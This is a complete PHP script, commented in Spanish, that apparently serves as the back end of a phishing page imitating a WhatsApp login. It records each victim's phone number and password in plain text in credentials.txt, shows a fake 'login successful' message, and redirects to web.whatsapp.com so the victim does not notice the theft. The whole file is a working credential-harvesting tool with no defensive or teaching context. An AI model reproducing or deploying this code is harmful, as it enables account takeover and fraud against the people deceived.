<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = $_POST['phone'];
    $password = $_POST['password'];

    // Aquí puedes agregar código para guardar las credenciales en una base de datos o un archivo
    $file = 'credentials.txt';
    $current = file_get_contents($file);
    $current .= "Teléfono: $phone, Contraseña: $password\n";
    file_put_contents($file, $current);

    echo "Inicio de sesión exitoso. Redirigiendo...";
    header("refresh:2;url=https://web.whatsapp.com/");
    exit();
}
?>
